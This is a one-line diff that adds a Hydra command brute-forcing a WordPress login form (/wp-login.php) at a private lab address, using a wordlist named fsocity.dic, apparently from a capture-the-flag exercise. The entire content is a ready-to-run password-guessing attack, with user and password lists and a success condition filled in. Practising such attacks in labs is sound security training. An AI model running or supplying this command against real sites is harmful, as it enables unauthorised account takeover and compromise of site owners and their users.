@@ -1,0 +1,1 @@
+hydra -L fsocity.dic -P /usr/share/wordlists/dirb/common.txt 10.10.18.108 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
